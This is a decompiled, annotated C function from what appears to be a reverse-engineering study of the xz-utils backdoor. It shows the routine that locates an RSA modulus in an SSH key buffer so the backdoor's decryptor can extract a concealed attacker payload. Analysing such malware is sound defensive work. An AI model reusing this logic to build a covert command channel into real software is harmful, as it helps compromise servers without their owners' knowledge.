// /home/kali/xzre-ghidra/xzregh/107F20_sshbuf_extract_rsa_modulus.c
// Function: sshbuf_extract_rsa_modulus @ 0x107F20
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshbuf_extract_rsa_modulus(sshbuf * sshbuf_data, size_t sshbuf_size, size_t * out_payload_size, global_context_t * ctx)


/*
 * AutoDoc: Scans `sshbuf->d` for a 7-byte prefix match against the `"ssh-rsa-cert-v01@openssh.com"` / `"rsa-sha2-256"` markers, then
 * uses the surrounding big-endian length fields to walk the serialized key blob. It validates every intermediate length
 * (capping them at 0x10000), requires that the modulus mpint reaches the record tail (so the parse stays aligned), strips a
 * leading 0x00 sign byte when present, and rewrites `sshbuf->d` to point directly at that modulus blob. The extracted length
 * is returned via `out_payload_size` so the decryptor knows exactly how many bytes to peel off.
 */

#include "xzre_types.h"

BOOL sshbuf_extract_rsa_modulus
               (sshbuf *sshbuf_data,size_t sshbuf_size,size_t *out_payload_size,
               global_context_t *ctx)

{
  uint *record_end_ptr;
  char expected_char;
  u8 *sshbuf_start;
  size_t cursor_offset;
  uint *modulus_cursor;
  u32 field_length;
  long cmp_index;
  u8 *alg_match_cursor;
  uint *field_cursor;
  size_t window_size;
  size_t modulus_length;
  u8 *modulus_data;
  size_t cert_type_namelen;
  size_t remaining;
  u8 *sshbuf_end;
  u8 *data_end;
  u32 length;
  u8 *p;
  char *cert_type;
  size_t i;
  
  if ((sshbuf_data == (sshbuf *)0x0) || (sshbuf_size < 7)) {
    return FALSE;
  }
  if ((out_payload_size != (size_t *)0x0) && (ctx != (global_context_t *)0x0)) {
    if (ctx->ssh_rsa_cert_alg == (char *)0x0) {
      return FALSE;
    }
    if (ctx->rsa_sha2_256_alg == (char *)0x0) {
      return FALSE;
    }
    sshbuf_start = sshbuf_data->d;
    // AutoDoc: Reject buffers whose base-plus-size would wrap the address space—those pointers would leave the sshbuf view.
    if (CARRY8((ulong)sshbuf_start,sshbuf_size)) {
      return FALSE;
    }
    cursor_offset = 0;
    do {
      // AutoDoc: Slide a search window across the buffer, preferring the cert algorithm tag and falling back to the RSA-SHA2 string.
      alg_match_cursor = sshbuf_start + cursor_offset;
      cmp_index = 0;
      window_size = sshbuf_size - cursor_offset;
      while( TRUE ) {
        expected_char = ctx->ssh_rsa_cert_alg[cmp_index];
        if (((char)alg_match_cursor[cmp_index] < expected_char) || (expected_char < (char)alg_match_cursor[cmp_index])) break;
        cmp_index = cmp_index + 1;
        if (cmp_index == 7) goto LAB_00107fd1;
      }
      cmp_index = 0;
      while( TRUE ) {
        expected_char = ctx->rsa_sha2_256_alg[cmp_index];
        if (((char)alg_match_cursor[cmp_index] < expected_char) || (expected_char < (char)alg_match_cursor[cmp_index])) break;
        cmp_index = cmp_index + 1;
        if (cmp_index == 7) goto LAB_00107fd1;
      }
      cursor_offset = cursor_offset + 1;
    } while (sshbuf_size - cursor_offset != 6);
    alg_match_cursor = (u8 *)0x0;
    window_size = 6;
LAB_00107fd1:
    if ((7 < cursor_offset) && (alg_match_cursor != (u8 *)0x0)) {
      // AutoDoc: Use the big-endian length that precedes the algorithm name to clamp the serialized key record.
      field_length = *(uint *)(alg_match_cursor + -8);
      field_length = field_length >> 0x18 | (field_length & 0xff0000) >> 8 | (field_length & 0xff00) << 8 | field_length << 0x18;
      if (0x10000 < field_length) {
        return FALSE;
      }
      record_end_ptr = (uint *)(alg_match_cursor + ((ulong)field_length - 8));
      if (sshbuf_start + sshbuf_size < record_end_ptr) {
        return FALSE;
      }
      // AutoDoc: Treat the algorithm string as bounded input so we never read past the declared record tail.
      cursor_offset = strnlen_bounded((char *)alg_match_cursor,window_size);
      if (window_size <= cursor_offset) {
        return FALSE;
      }
      field_cursor = (uint *)(alg_match_cursor + cursor_offset);
      if (record_end_ptr <= field_cursor) {
        return FALSE;
      }
      field_length = *field_cursor;
      field_length = field_length >> 0x18 | (field_length & 0xff0000) >> 8 | (field_length & 0xff00) << 8 | field_length << 0x18;
      if (0x10000 < field_length) {
        return FALSE;
      }
      field_cursor = (uint *)((long)field_cursor + (ulong)(field_length + 4));
      if (record_end_ptr <= field_cursor) {
        return FALSE;
      }
      field_length = *field_cursor;
      field_length = field_length >> 0x18 | (field_length & 0xff0000) >> 8 | (field_length & 0xff00) << 8 | field_length << 0x18;
      if (0x10000 < field_length) {
        return FALSE;
      }
      modulus_cursor = field_cursor + 1;
      // AutoDoc: Require the modulus mpint to extend to the end of the enclosing record; otherwise reject the candidate parse.
      if ((uint *)((ulong)field_length + (long)modulus_cursor) <= record_end_ptr) {
        return FALSE;
      }
      // AutoDoc: mpint encoding: skip the leading 0x00 sign byte (used when the high bit would make the value negative) and decrement the length.
      if ((char)field_cursor[1] == '\0') {
        modulus_cursor = (uint *)((long)field_cursor + 5);
        field_length = field_length - 1;
      }
      // AutoDoc: Point the caller's sshbuf directly at the modulus blob and report its length via `out_payload_size`.
      sshbuf_data->d = (u8 *)modulus_cursor;
      *out_payload_size = (ulong)field_length;
      return TRUE;
    }
  }
  return FALSE;
}

